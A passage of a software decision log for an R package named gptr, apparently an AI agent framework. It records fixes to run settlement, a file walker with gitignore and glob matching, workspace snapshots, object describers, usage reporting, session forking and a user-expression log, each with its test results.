   `allow_runs = NULL` (every run) whenever `run_current()` was `NULL`. That includes a pump nested
   in a hook or another reactor callback while another run is between steps: such a pump ran that
   other run's queued tool inside the hook, one pump level deeper. The choice is now by pump
   depth: every run only in the outermost pump (`reactor_depth() == 0`), else the awaited runs.
   Inside a tool this equals the plan's behaviour.
4. **A stream redactor that failed closed does not end the run** (D-010). A redactor that
   exceeded its hold-back limit keeps failing. The plan's `run_flush_deltas()` let its `flush()`
   error escape `run_response()`, which settled a complete response with status `error`
   (`gptr_error_internal`). Its held text is now dropped with a registry diagnostic, never
   emitted, and the response is recorded as usual.
5. **Settlement finishes when the store fails** (04 section 7.6, `session_run()` "runs `s` to
   settlement"; rule R2; the plan's own "the session never stays `running`"). The plan's
   `run_settle()` set `run$settled` first and then wrote to the store (`run_returns()`'s value
   entry, `plugin_state_persist()`) before it set the session's status, cleared the live run,
   released the reactor's hold and the frame bindings and emitted `agent_end`. A store failure
   (`gptr_error_internal`, "the session store failed") escaped, and `run_fail()` returned at once
   because the run was already settled: the session stayed `running` for good, every later
   `run_start()` raised `gptr_error_busy`, and no condition reached the caller.
   `run_settle_persist()` now runs those steps (and the last-text update) under one handler. A run
   with no terminal condition of its own (`idle`) settles with status `error` and the store's
   condition (a non-gptr error becomes `gptr_error_internal`, as in `run_fail()`); a run that
   ends `aborted` or already holds a condition (`error`, `max_turns`, `budget`, `blocked`) keeps
   it, and the store failure is a registry diagnostic (event `settle`). `run_abort()` guards its
   partial-answer append the same way (diagnostic, event `abort`), so under the abort-only policy
   the interrupt, not a store error, is re-signalled.
6. **An abort before the stream's `start` event records the run's model.** P01's accumulator
   answers `"unknown"` for api, provider and model until `start`, and never throws, so the plan's
   fallback to the run's model never ran. `run_partial_message()` uses the accumulator only once
   `start` was seen (`run$status == "streaming"`), else an empty message of `run$model` with the
   request id and route, as P05's `stream_partial()` does.

Unchanged: the estimator fill itself (contract 4.3; D-024 item 2, D-025 item 2, D-033 item 1 and
D-036 item 8 rely on it), and `provider_stream()`'s IC-74 refusals (a decision-only model, a
refused request preflight, which reads the run's frozen safety snapshot, a missing key), which end
the run with status `error` before any request, through `run_fail()`.

Validation: `progress/P06.md`, Task 10 (`test-agent-run.R`; the added blocks failed 9 assertions
against the plan-literal engine: 5 for item 1, 1 for item 2, 1 for item 3 (a tool run at pump
depth 2), 2 for item 4), and its review round 1 (items 5 and 6: 5 blocks that failed 21
assertions before the fix).

## D-039 - P10 r-call marker: ns_r_call() never forces or calls a gptr_r_call binding (2026-10-04)

P10 Task 1's plan-literal `ns_r_call()` (`R/tool-namespace.R`) walks `sys.frame(k)` outwards
with `exists()` + `get()`. `get()` forces a promise and calls an active binding. So a user
frame on the stack with a lazy argument or an active binding named `gptr_r_call` had it forced or
called from inside a `gptr$` member. For example, model code
`f = function(gptr_r_call) gptr$read("x"); f(stop("boom"))` raised `boom` from the member. That
contradicts the plan's own docstring ("no promise is forced", plan line 268) and architecture
section 6.4 R3, which never forces a user promise from a frame walk.

The walker now checks a binding only when it exists and `rlang::env_binding_are_lazy()` and
`rlang::env_binding_are_active()` are both `FALSE`. Both are sanctioned rlang uses
(architecture section 9.1), and rlang is already in Imports. A promise that was already forced
is no longer lazy, so it is still read. The `r` tool binds the marker as an ordinary local value
(P10 Task 11, plan line 7180), so no real marker is ever skipped. No contract or interface
changes; `ns_r_call()` still returns the innermost marker or `NULL`.

Validation: `progress/P10.md`, Task 1 (`test-tool-namespace.R`). One block was added, "a lazy or
active binding called gptr_r_call is neither forced nor called" (3 expectations). Against the
plan-literal walker, a scratch reproduction forced the promise and called the active binding
(`dev/.validation/P10/task1-red-lazy-binding.log`). Green is `[ FAIL 0 | WARN 0 | SKIP 0 |
PASS 31 ]`: the plan's 28 expectations, unchanged, plus these 3.

## D-040 - P09 workspace snapshot: missing arguments are listed, not fatal; display text is valid UTF-8; linear on large workspaces (2026-10-04)

P09 Task 2's plan-literal `env_snapshot()`, `workspace_lines()`, `changes_lines()` and
`env_fmt_n()` (`R/env-snapshot.R`) were changed in the four ways below. Each was found by a probe
of the plan-literal source (`dev/.validation/P09/task2-probe-plan-literal.log`). The contract's
columns, kinds and line grammar are unchanged.

1. **A binding holding R's missing argument is a row, not an error** (04 section 2.2: evaluation
   failures never throw; 04 section 7.9: the snapshot never forces anything). A function-frame
   home has one when a formal without a default was not supplied, or when `...` is empty. The
   plan's `get()` and its fallback `get()` both threw 'argument "x" is missing, with no
   default', so any `r` call in such a home would fail. A failing `get()` also leaves the home on
   its unwound frame. A fresh-process control gives one copy of the user's object on the next
   edit, bare or inside `tryCatch()` through the box (`task2-copy-negative-control.log`).
   `env_snap_missing()` now checks first, with `identical(.subset2(envir, name), quote(expr = ))`.
   It evaluates nothing, it is called only for non-lazy, non-active bindings, and it treats a
   forced default (whose `missing()` is TRUE) as a value. The row has kind `value`, class
   `<missing>`, shape `""`, and no address, fingerprint or size. `<workspace>` shows
   `x  <missing>`, like `<promise>`/`<active>`. An assignment to it later is `modified`.
2. **Display text is valid UTF-8** (IC-62). An object name need not be valid UTF-8
   (`assign("\xe9t\xe9", 1)`). `workspace_lines()` threw "invalid multibyte string" in
   `nchar()`, and `changes_lines()` warned "unable to translate". Names, classes, shapes and
   `user ran:` text now pass `env_text()`: `as_utf8()`, then `<xx>` byte escapes for whatever is
   still invalid. Snapshot `name`s keep the exact binding names, because later `get()` calls and
   diffs use them.
3. **Counts ignore `OutDec`.** `env_fmt_n()` passes `decimal.mark = "."`. Under
   `options(OutDec = ",")`, `format()` warned that both marks are `,`.
4. **No quadratic loops, same output.**
   - The snapshot loop fills plain vectors and builds the data frame once, and it matches
     `previous` once. Writing data-frame cells copied a column per binding: 20,000 bindings took
     3.27 s, now 1.05 s.
   - `changes_lines()` cuts more than `budget + 1` lines before its line-by-line trim. Every
     line costs more than one estimated token, so those lines never fit, and the result is the
     same. A 20,000-name diff took 32 s, now 0.03 s, with the same 47 lines.

Validation: `progress/P09.md`, Task 2. Four blocks (21 expectations) and one copy row were added
to the plan's tests, which are unchanged. Against the plan-literal source the four blocks gave
`[ FAIL 4 | WARN 1 | SKIP 0 | PASS 51 ]`. The final result for `env-snapshot|copy-eval` is
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 69 ]`, and `^env-snapshot$` under `LC_ALL=C` passes 66.

## D-041 - P10 walker: the prune list always wins at the walk root, git's bracket-expression rules, one ignore-file precedence, non-ASCII, invalid and newline names, a git root at "/" (2026-10-04)

P10 Task 2's plan-literal `R/tool-walk.R` (`walk_files()`, `glob_to_regex()`, the `.gitignore`
engine; an L4 service that P11, P16 and P18 consume) had four defects. Its own 48 expectations
pass against the literal source; each defect below was shown by an added test against that
source (`dev/.validation/P10/task2-red-plan-literal.log` and `...-clocale.log`; items 5-7, found
in review round 1, by `task2-fix1-red.log`; items 8-9, found in review round 2, by
`task2-fix2-red*.log`). No exported signature changes; the returned data frame gains one
attribute, `invalid_names` (item 7); `glob_to_regex()` can now raise `invalid_argument` for a glob
that has no valid translation (item 8); the internal `glob_translate()` takes `git` instead of the
plan's `braces` (item 8).

1. **The prune list always wins** (contract section 7.10: the walker "skips `.git`,
   `node_modules`, `renv`, `.venv`, `__pycache__`"; report 11 section 4.5: "always pruned").
   The plan compiled the prune list as the first ignore rules, so a later negation in an ignore
   file re-included a pruned directory. The common whitelist `.gitignore` (`*`, `!*/`, `!*.R`)
   made the walker descend `.git/` and `node_modules/` and return `.git/hooks/h.R` and
   `node_modules/m/x.R`. `walk_tree()` now evaluates the prune rules on their own (still with
   the plan's anchoring and last-match-wins inside the list) and drops every entry they match
   before the ignore rules are consulted. `prune = character()` still turns pruning off.
2. **Bracket classes.** `glob_translate()` escaped the `]` that closes a POSIX class, so
   `[[:digit:]]` matched the set `{[ : d i g t ]}` instead of a digit (in globs and in ignore
   files), and it left a leading `]` unescaped after the `[^/` it emits for `[!...]`, so `[!]a]b`
   compiled to "one non-slash character, then `a]b`". The new `glob_class_body()` kept a known
   POSIX class verbatim and escaped every other `[`, `]` and backslash (superseded by item 8).
3. **One ignore-file precedence.** The plan reads an ancestor directory's ignore files in the
   order `.gitignore`, `.ignore`, `.gptrignore` (the last match wins, so `.gptrignore` wins) but
   a walked directory's in `list.files()` order, where `.ignore` sorts last. The same tree then
   gave different file sets when walked from its root and from a subdirectory. Walked
   directories now use the ancestors' order.
4. **Non-ASCII paths in a non-UTF-8 locale** (IC-62; architecture section 6.6; the hosted
   `LC_ALL=C` job). `basename()` and `dirname()` stop with "unable to translate ... to native
   encoding" on a marked UTF-8 non-ASCII string there, so `walk_files()` failed for any
   non-ASCII root (`fs_case_insensitive()`, `git_root_of()`) or entry name (`ignore_eval()`).
   The basename is now taken with `sub()` (`"(?s)^.*/"` since item 9), the two root helpers work
   on the unmarked bytes of `fs_path()` (and `git_root_of()` returns `as_utf8()`), and
   `resolve_tool_path()` passes `fs_path(p)` to `path.expand()`.
5. **The prune list is anchored at the walk root.** The plan matched the prune list, like the
   ignore rules, against paths relative to the git root, so its anchored entries
   (`renv/library/`, `renv/staging/`, `renv/sandbox/`, `packrat/lib*/`, `packrat/src/`) never
   applied when the walked directory was a subdirectory of a repository: `walk_files("proj")`
   below a git root returned `renv/library/pkg/DESCRIPTION` while `walk_files("proj",
   gitignore = FALSE)` pruned it (the prune list does not depend on git; report 11 section 4.5,
   "git does not know gptr's default prune list"). The prune rules are now matched against the
   path relative to the walk root, in both modes, as report 11's ripgrep accelerator does with
   `wd = root`; ignore-file rules stay relative to the git root. Walking `renv/` itself now
   lists `library/` unless an ignore file excludes it (renv's own `renv/.gitignore` does); an
   explicit path inside a pruned directory was already honoured (report 11 risk 8).
6. **A git root at the file-system root.** `git_root_of()` returns `/` or `C:/` there (with the
   slash), and the plan's `substring(root, nchar(groot) + 2L)` then dropped the first character
   of the relative prefix (`rivate/tmp/proj`), so ancestor ignore files were looked up at wrong
   paths and silently skipped and anchored rules never matched. The prefix is measured, and the
   ancestor and `.git/info/exclude` paths are joined, on the git root without trailing slashes.
7. **Entry names that are not valid UTF-8** (IC-62 ingress). A name `as_utf8()` cannot repair
   (for example Latin-1 bytes on Linux in a UTF-8 locale) stopped the whole walk in
   `tolower()`/`sub(perl = TRUE)` (the plan's `tolower()` sort already failed on it). No UTF-8
   path can name such an entry, and passing its bytes on would break JSON output downstream, so
   the walker skips it right after listing (a directory is not descended) and counts it in the
   new `invalid_names` attribute of `walk_tree()` and `walk_files()`, which P11's `find`/`ls`
   can report. The listing goes through the new one-line helper `walk_list_dir()` so a test can
   inject such a name (APFS cannot create one).

8. **Bracket expressions follow git's wildmatch and always compile** (contract section 7.10:
   `glob_to_regex()` returns a PCRE). Item 2 still emitted an invalid PCRE for legal patterns: a
   class body that starts and ends with `:`, `.` or `=` (`[:digit:]`, `[=a=]`, the typo
   `[[:digit:]`), a reversed range (`[z-a]`) or a `-` next to a POSIX class (`[[:digit:]-z]`). One
   such line in any ignore file stopped the whole walk with a base-R error and a leaked PCRE
   warning, and `glob_to_regex()` returned a pattern that does not compile. `glob_class()` now
   replaces the plan's class scan and `glob_class_body()` with one parser that follows git's
   wildmatch: after `!`/`^` a first `]` is literal, a backslash escapes the next character (the
   plan kept it literal; `[\]]` is the set `{]}`), `-` is literal first, last or right after a
   range or class, `[:name:]` closes at the first `]`, and every character is emitted escaped or
   inside a range, so a class always compiles (`[:digit:]` is the set `{: d i g t}`). In ignore
   files (`glob_translate(git = TRUE)`, which replaces the plan's `braces = FALSE`) the rest of
   wildmatch applies: a reversed range keeps only its first character (`[z-a]` matches `z`); an
   unclosed bracket expression or an unknown class name (`foo[bar`, `[[:word:]]`) matches nothing,
   so the rule is dropped; a class never matches `/`; on a case-insensitive file system
   (`core.ignorecase`, `fold = TRUE`) class characters are compared as written (`[A]` matches
   nothing), a range also matches a lower-case letter whose capital it holds (`[*-a]` matches `b`),
   `[:upper:]` and `[:lower:]` match every letter, and an escaped capital (`\A`) never matches. In
   globs a reversed range or an unknown class name is an `invalid_argument` error (fd/globset
   rejects a reversed range) and an unclosed `[` stays literal (plan). Brace alternation skips
   escaped braces (`{a,\}` is literal). Safety net: `ignore_compile()` drops a rule whose PCRE does
   not compile and `glob_to_regex()` raises `invalid_argument` for one (`{a,[}]`), both through
   P02's `spec_regex_ok()` (`ext-specs.R`, L0). A scratch oracle of 114 one-line ignore files
   (bracket edge cases and case-folding probes) agrees with `git ls-files` with `core.ignorecase`
   true and false and in the UTF-8 and C locales, except one known difference kept by design:
   wildmatch compares bytes, so `?` or a class matches one byte of a multi-byte UTF-8 character
   there (`?[A-Z]` matches `\u00c9t` in git); the walker matches characters.
9. **Names holding a newline.** Item 4's `sub(".*/", ...)` stops at a newline (PCRE `.`), so the
   basename of `x\ny/z.log` was `x\nz.log` and unanchored rules missed it (the plan's
   `basename()` was right). The `.*` of emitted patterns (`**`, the `(?:.*/)?` prefix of
   `glob_to_regex()`) did not cross a newline either, and `$` also matches before a final newline.
   The basename is now `sub("(?s)^.*/", ...)` and `glob_anchor()` anchors every emitted PCRE as
   `(?s)^...\z`, in ignore rules and in `glob_to_regex()` (whose result now starts with `(?s)`;
   its consumers use it with `perl = TRUE`). Git and fd match such names the same way.

Validation: `progress/P10.md`, Task 2 (`test-tool-walk.R`). Ten blocks were added, 30
expectations: "bracket classes keep POSIX classes and a literal `]` after the negation" (4),
".gptrignore wins over .ignore, which wins over .gitignore, at every level" (2), "a negation in
an ignore file never re-includes a pruned directory" (2), "non-ASCII directory and file names
are walked and matched in any locale" (3), "the prune list is anchored at the walk root, also
below a git root" (2), "a git root at the file-system root keeps the ancestor rules" (1, with
`git_root_of()` mocked) and "an entry whose name is not valid UTF-8 is skipped and counted,
never fatal" (2, with `walk_list_dir()` mocked); "bracket expressions follow git's wildmatch and
always compile" (9), "case folding inside brackets follows git's wildmatch (core.ignorecase)" (2,
with `fs_case_insensitive()` mocked both ways) and "a file name holding a newline is matched like
git" (3, skipped on Windows). Against the plan-literal source:
`[ FAIL 5 | WARN 0 | SKIP 0 | PASS 54 ]` in a UTF-8 locale, `[ FAIL 6 | WARN 0 | SKIP 0 |
PASS 51 ]` under `LC_ALL=C` (items 1-4, before items 5-7 existed). Items 5-7 against the round-0
source: `[ FAIL 3 | WARN 0 | SKIP 0 | PASS 60 ]`. Items 8-9 against the round-1 source:
`[ FAIL 4 | WARN 0 | SKIP 0 | PASS 64 ]` (the bracket block stops at its first walk with the
invalid-PCRE error; its 7 glob expectations all fail there too, `task2-fix2-red-globs.log`), and
the case-folding block against the parser without folding `[ FAIL 1 | WARN 0 | SKIP 0 |
PASS 77 ]`. Green is `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 78 ]` in both locales: the plan's 48
expectations, unchanged, plus these 30.

## D-042 - P06 gptr_usage(): unknown usage prints as unknown, an unknown model is the NA group, the System 1 log is read without a catch-all (2026-10-04)

P06 Task 11's literal `gptr_usage()` predates IC-74 (07-local-ollama.md section 5: "Missing usage
remains unknown"). The behaviour now, which Task 15's `ctx$usage()`, P08's printing and P19's
team and fan-out containers consume:

1. **The footer prints unknown usage as unknown.** The cost goes through `format_cost()` (D-024):
   `unknown cost` when any included cost is unknown, never `$NA`; the tokens in (input plus cache
   reads) go through `format_count()`: `unknown tokens in`. A known zero stays `$0.0000`. One
   request reads `1 request`. Group sums and the `totals` attribute stay the plan's `sum()`
   without `na.rm`, so a group or total that includes an unknown value is `NA` (now tested).
2. **`by = "model"` groups an unknown provider or model as `NA`.** The plan pasted
   `provider/model`, which turned unknown parts into invented model names (`"NA/NA"`,
   `"fake/NA"`) and split the unknown requests over several groups.
3. **`x = NULL` reads P05's `usage_log()` without a catch-all.** The plan wrapped it in
   `tryCatch(..., error = function(e) NULL)`, which would silently drop the System 1 requests
   from the totals. `usage_log_append()` validates every row, so `usage_log()` does not fail on a
   well-formed log; a failure now surfaces instead of an understated total.

`detail = TRUE` is not a deviation: as planned, it binds the given sessions' own ledgers
(`ledger_add()` writes to the requesting session only), so a child's requests are in the child's
ledger and the last row is the session's own last request, which P14's `/context`
(`cmd_context()`) reads. Contract 04 section 6.5 rolls children up only for `detail = FALSE`.

Validation: `progress/P06.md`, Task 11 (`test-session-budget.R`; the added tests failed 7
assertions against the plan-literal code, and every plan test passed against both).

## D-043 - P09 describers: list, matrix and data frame columns, invalid UTF-8, missing arguments, reference class objects and S4 slots; silent and within budget; method results that are not lines (2026-10-04)

P09 Task 3's plan-literal `R/env-describe.R` was changed in the eight ways below. Items 1-7 were
found by a probe of the plan-literal source (`dev/.validation/P09/task3-probe-plan-literal.log`,
script `task3-probe.R`), item 8 by the task review. The descriptions of the plan's 20 fixture objects are unchanged byte for byte
(`task3-facts-plan-literal.log` and `task3-facts-adapted.log`: 92 of G2's 98 facts, the longest
130 tokens). No signature, condition class or exported behaviour of 04 section 6.6 changes.

1. **Data frame columns that are not plain vectors.** A list column (tibble list columns), a
   matrix column (`df$m = matrix(...)`, `scale()` results) or a data frame column (packed
   columns, nested `jsonlite::fromJSON()` results) made the data frame method throw while it
   built the rows level: "arguments imply differing number of rows", or "argument must be
   coercible to non-negative integer" after a 'length.out' warning, or tibble's recycling error.
   `describe_value()`, which Task 10's `attached` block calls, threw; `describe_binding()` fell
   back to the default method (`<data.frame> 3 x 2`, `typeof list`). The new leaf
   `dsc_leaf_col()` samples values of plain vectors only. Other columns give class and shape:
   `$ l <list> length 3`, `$ m <matrix> 3 x 2`, `$ inner <data.frame> 3 x 2`, and cells such as
   `<list>` in the rows.
2. **Text that is not valid UTF-8** (IC-62). Invalid bytes in list or data frame names, factor
   levels or list strings made P01's `est_tokens()` (a PCRE `gsub()`) or `substr()` throw
   ("input string 1 is invalid UTF-8", "invalid multibyte string"). Every level passes Task 2's
   `env_text()` before it is measured, so the lines are valid UTF-8 with `<xx>` escapes.
   `describe_binding()` shows the name the same way.
3. **Missing arguments.** An environment that holds R's missing argument (the frame of a call
   that left a formal unsupplied) made `dsc_env_is_fun()`'s `get()` throw. It now reads the
   binding with `.subset2()`, which returns the missing argument as a value. `describe_binding()`
   of a missing argument or of empty `...` gave `<?> (describe failed: argument "n" is missing,
   ...)`. The failing `get()` also left the function-frame home on its unwound frame: a
   fresh-process row against the plan-literal source counts `1 copies of big` on the next edit
   (D-040 item 1 found the same for the snapshot). It now returns `name: <missing>`, Task 2's
   `<missing>`, checked with `env_snap_missing()` before any `get()`.
4. **Reference class objects.** S3 dispatch sends an RC object (S4, extending `environment`) to
   `gptr_describe.environment()`, where rlang's binding predicates refused it (`` `env` must be an
   environment ``). `dsc_leaf_env()` reads its `as.environment()`.
5. **S4 slots.** A slot holding `NULL` is stored as R's pseudo-NULL symbol and was shown as
   `<name> length 1`; it is now `<NULL> length 0`. When methods has no definition of the class
   (its package is not installed), `methods::slotNames()` is empty and the header ended in
   `slots: `. The slot names now come from the attribute names (slots are attributes; IC-71).
6. **Silent and within budget.**
   - The lm method calls `summary()` under `suppressWarnings()`: its "essentially perfect fit"
     warning reached the caller.
   - Strings are cut to 40 characters in the character examples and the data frame rows. One
     300-character cell pushed a data frame's rows level to 603 tokens.
   - `dsc_fit()` also cuts a first line that alone overruns the budget. A third-party method with
     a 2,100-character header gave 888 tokens at budget 20. The `<?>` note passes `dsc_fit()`.
7. **A forced `level` is a whole number of at least 1** (04 section 2.2). `level = 0` was clamped
   to 1 and `level = NA` returned `NULL`. Both now signal `gptr_error_invalid_argument`; a level
   above the method's last still gives its richest.
8. **A method result must be lines** (04 section 6.6: "the first a header"). The harness passed
   a third-party method's `character(0)`, `NULL` or `NA_character_` through:
   `describe_value()` returned `character(0)` or `NA`, and `describe_binding()` built `q: NA`. A
   method returning an environment made `as.character()` throw. The new helper `dsc_lines()`
   accepts a non-empty atomic vector without `NA`. For anything else, `describe_value()` returns
   the default method's description, and a forced-level retry that is not lines is skipped. This
   is checked rather than signalled, because an error would unwind `describe_value()`, which holds
   the object (see the known limit below). A fresh-process probe counts 0 copies on the next edit
   for the `NULL`, `character(0)` and `NA` fallbacks (`task3-fix1-copy-probe.log`).

Known limits (R semantics, not changed):
- S3 dispatch on an S4 object whose class's package is installed but not loaded loads that
  namespace (`UseMethod()`, `inherits()` and `length()` all do), so neither the generic nor a
  method can prevent it (`task3-s4-namespace-load.log`).
- **A method that throws costs one copy** of the described object, an exception to [R4] on the
  "errors caught" path (04 section 7.9). This is the plan's design, not a change. The error
  unwinds `describe_value()`, the generic and the method with a longjmp. Their bindings (the
  argument promises) hold the object, and R releases a closure frame's references
  (`R_CleanupEnvir()`) only when it returns normally. The user's next in-place edit copies once.
  After that the new object is referenced once again, so the cost is one copy per failure.
  `describe_binding()` still returns the default method's lines. No R-level code can avoid this,
  because the method's own frame binds the object. The added row in `test-copy-eval.R`
  (`allow = 1L`) catches any regression beyond one copy. Methods that return normally, built-in
  or third-party, cost none.

Validation: `progress/P09.md`, Task 3. Eleven blocks (54 expectations) and two copy rows were
added to the plan's tests, which are unchanged. Against the plan-literal source:
`[ FAIL 15 | WARN 0 | SKIP 0 | PASS 103 ]` (items 1-7; item 8's red is in the review round 1 entry).
Final `env-describe|copy-eval`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 160 ]`; `^env-describe$` under
`LC_ALL=C` passes 153.

## D-044 - P06 gptr_fork(): a cut keeps the entries that close its turn, an empty or oversized entry id is a classed refusal, a cancel reason must be one string, the IC-53 refusal names level 4, a cut inside a turn keeps only the values recorded before it, a fork that copies no gptr.frozen entry freezes its own, forkOf.entry is an entry the fork copied (2026-10-04)

P06 Task 12's plan-literal `gptr_fork()` passes all of the plan's tests against the real P01-P05
and P06 Tasks 1-11 code. Seven details changed, each shown by an added test against that source
(item 5 was found in review round 1, items 6 and 7 and the oversized id of item 2 in round 2):

1. **A cut at the end of a turn keeps the entries that close the turn.** The plan's
   `fork_boundaries()` placed a boundary on a message only, so `at = NULL` and `at = k` cut
   before the entries that follow the turn's last message. The turn's `gptr.value` is such an
   entry: `session_value_set()` (Task 4) appends it after the answer, and so do Task 9's
   `run_returns()` and P08's gateway when they designate the value of a call. The fork kept the
   value in memory (`fd$values`), but not in its transcript or its file. Task 13's planned
   `store_rebuild()` restores values from the `gptr.value` entries of the path
   (`rebuild_values()`), so a resumed fork would have lost the value of its last copied turn.
   For an idle source, `gptr.forkOf.entry` was also not the source's leaf (S22 asserts that
   equality; it held only while nothing followed the final answer). Now a boundary extends over
   the entries that directly follow it and carry no message: a value, a model or mode change
   made after the answer, a compaction, a label (still dropped by `store_fork()`). Operator
   messages (`custom_message`) are relays for the model's next step and never extend a boundary.
   Which messages are boundaries (no tool call awaiting its result, error and aborted replies
   skipped) is unchanged, and so are a running source's cut and the turn numbers.
2. **An empty or oversized entry id is refused with `gptr_error_invalid_argument`** (`arg = "at"`,
   04 section 1.1), before `session_before_fork` is emitted, as a malformed number already is.
   The plan's `exists("", envir = d$index)` raised base R's unclassed "invalid first argument",
   and `exists()` of a string over 10000 bytes raises the unclassed "variable names are limited
   to 10000 bytes" (no such string can name an entry of `.d$index`).
3. **A cancel's reason is used only when it is one non-empty string**; otherwise the message says
   "no reason given". The plan pasted a vector reason into a message of several lines and read
   `dec$cancel`/`dec$reason` with `$`, which matches prefixes (D-030 item 8 precedent: exact
   `[[`).
4. **The IC-53 refusal of `session_control_check()` carries `risk = 4L`**, the level of the
   `control` category (IC-53 item 3), as P02's `ext_control_guard()` and P08's planned
   `control_check()` do. The plan gave `risk = NULL`. The tool name is read with `[[`.
5. **A cut inside a turn keeps only the values recorded before the cut.** The plan kept every
   value of the turns up to the cut's turn (`turn <= cut turn`). An entry-id cut can fall inside
   turn `k`, at its prompt or at its answer, before the `gptr.value` entries that close the turn.
   The fork then reported turn `k`'s value (`f$value`) although neither its transcript nor its
   file held the entry, so a resume (Task 13's planned `rebuild_values()`) would lose it: the
   mismatch item 1 removes for `at = NULL` and `at = k`. `fork_values()` starts from the plan's
   set and, for each `gptr.value` entry on the source path that the cut leaves out, drops the
   latest record of that turn and name (`session_value_set()` appends record and entry
   together). Records without an entry (the plan's value test sets `d$values` directly) still
   follow the turn rule. An integer or `NULL` cut of an idle source keeps the plan's set, since
   its boundary ends after the turn's closing entries (item 1), unless something that is not a
   closing entry separates a value entry from the answer; a running source's cut, which can fall
   between two tool rounds of the running turn, gets the same check.
6. **A fork that copies no `gptr.frozen` entry freezes its own prompt.** The plan set
   `fd$frozen = d$frozen` for every cut. A cut that copies nothing (`at = 0`, or `at = NULL` on a
   source with no closed boundary yet: still running, or failed in, its first turn) then shared
   the source's frozen prompt in memory, so the fork's first run skipped the freeze and its file
   never got a `gptr.frozen` entry, against 04 section 11.4 ("The first entry of every session is
   `gptr.frozen`"); P07's planned resume and Task 13's planned `rebuild_frozen()` read the prompt
   back only from that entry. Now `fork_frozen()` shares the source's prompt only when the copied
   path holds the `gptr.frozen` entry it came from (the last one on the source path); otherwise
   the fork freezes at its first run (its `session_start` there has reason `fork`, Task 9) and
   its file starts with its own `gptr.frozen`. Every cut that copies the source's freeze still
   shares the prompt, so a fork's first request re-reads the source's cached prefix (03 section
   10.2 item 5). The plan's `at = 0` test (no entries) is unchanged. Copying the source's
   `gptr.frozen` entry into an empty cut was not chosen: it changes that plan test, and `at = 0`
   is an empty conversation (04 section 5.1).
7. **`gptr.forkOf.entry` (`.d$fork_of$entry`) is the last entry the fork copied.** The plan used
   the cut entry, which can be a label: an entry id `at` naming a label (S23's scenario), and,
   since item 1, a boundary extended over a trailing label at `at = NULL` or `at = k`.
   `store_fork()` drops labels, so the id was in neither the fork's transcript nor its file.
   P16's planned `ckpt_rewind_ops(tree, target, d$fork_of$entry)` finds the copied range in the
   fork's own tree from that id, so a missing id gave an empty range, and a rewind of the fork
   would have undone the source's copied `gptr.checkpoint` records. The id is now `fd$leaf` after
   `store_fork()`, which equals the cut whenever the cut is not a label (S22 unchanged).

Not behavioural: the source's rank-0 specs are registered for the fork after `session_new()`
returns, so the fork's finalizer (`session_shutdown`, P02's `registry_session_drop()`) removes
them if a later step fails. The plan registered them first, under a fresh id that no live
session might ever hold.

Validation: `progress/P06.md`, Task 12. Twelve blocks (89 expectations) were added to the plan's
tests, which are unchanged. Against the plan-literal source, before review round 1:
`[ FAIL 13 | WARN 0 | SKIP 0 | PASS 403 ]`, all 13 in the seven blocks added then. The eighth
block (item 5), against the plan's value filter: 5 of its 9 expectations failed
(`^session-object$`: `[ FAIL 5 | WARN 0 | SKIP 0 | PASS 328 ]`). The four blocks of review round
2 (items 2, 6 and 7), against the round-1 source: 17 of their 29 expectations failed
(`^session-(object|store)$`: `[ FAIL 17 | WARN 0 | SKIP 0 | PASS 437 ]`). Final
`^session-(object|store)$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 454 ]`.

## D-045 - P09 user-expression log: the task callback walks every call linearly, default arguments included, and deparses nothing nested past 5,000 calls, a deparse() error becomes a note, multi-line expressions are one line, a removed callback is registered again, session ids are checked (2026-10-04)

P09 Task 4's plan-literal `R/env-history.R` (`user_log_push()`, `user_log_is_gptr()`,
`user_log_start()`, `user_log_stop()`) was changed in the ways below. Each was found by a probe of
the plan-literal source (`dev/.validation/P09/task4-probe-plan-literal.log`,
`task4-probe-callback-plan-literal.log`, `task4-probe-deep-plan-literal.log`). The internal
signatures, the callback name `gptr_history`, the 20-entry and 120-character limits and
`user_expr_log()` are unchanged. The plan's `user_log_is_gptr()` is replaced by
`user_log_scan()`, and the `active` field of `user_log_state` is gone (nothing outside the file
read it).

R calls a task callback through `R_tryEval()`. When the callback signals an error, R prints that
error at the user's prompt and removes the callback, so logging stops for every live session.
The callback therefore must not throw on any expression the parser can produce.

1. **A linear, non-recursive walk.** The plan's recursive walk read `expr[[i]]` for each
   argument. On a call that is a pairlist this is quadratic. Pasting one `x = c(<100,000
   numbers>)` line (a `dput()` of a long vector) made the callback run for 515 s before the
   next prompt. A 20,000-term expression, such as a generated function body, overflowed R's
   node stack. R then printed "node stack overflow ... user_log_is_gptr" and dropped the
   callback. `user_log_scan()` now walks the call tree breadth-first with `as.list()`. The same
   line takes 0.024 s. The children of a level are joined with
   `unlist(recursive = FALSE, use.names = FALSE)` (review round 2). The first version joined
   them with `do.call(c, ...)`, which passed their argument names to `c()`: a child under an
   argument named `recursive` or `use.names` bound to that formal, and the walk stopped there.
   `f(recursive = g(gptr("p")))` was logged, and a 6,000-level body under `recursive =` reached
   `deparse()` past the cap of item 2 (at 100,000 levels R segfaulted, per the reviewer).
2. **Expressions nested more than 5,000 calls deep are not deparsed.** The new walk alone moved
   the failure into `deparse()`, which recurses in C. At about 100,000 levels it ends in
   "segfault from C stack overflow", which no handler catches. The walk counts levels and stops
   at R's default `expressions` limit. Such an entry is logged as
   `<expression nested more than 5000 calls deep>`. The levels include the default arguments
   of `function()` (review round 3). Its formals are a pairlist, not a call, and the first walk
   kept only calls, so it never looked inside a default: `f = function(x = a + ... + a) 1` with
   100,000 terms scanned as two levels deep, reached `deparse()` and segfaulted in a child
   Rscript, and R dropped the callback (with 6,000 terms a 120-character text was logged
   instead of the note). `g = function(x = gptr("p")) x` was logged. The walk now adds the
   elements of each pairlist child to the same level; a missing default (an empty symbol) is
   not a call and ends there, as the empty argument of `x[, 1]` does.
3. **Multi-line expressions are one line** (04 section 7.9: "deparsed and cut to 120
   characters"). With `nlines = 1L`, the plan logged only the first deparsed line: `{`,
   `for (i in 1:3) {`, `f = function(x) {`, `if (TRUE) {`. The lines (at most 120) are now
   trimmed and joined, with `"; "` between statements: `for (i in 1:3) { y = i; z = y + 1 }`.
   A break inside one statement takes a space. Inside braces `deparse()` breaks an `if` after
   `if (cond) ` and before `else`, and past 500 bytes it breaks after `, ` or a binary operator.
   The glue is a space when the untrimmed line ends with `{` or with a space (`deparse()` leaves
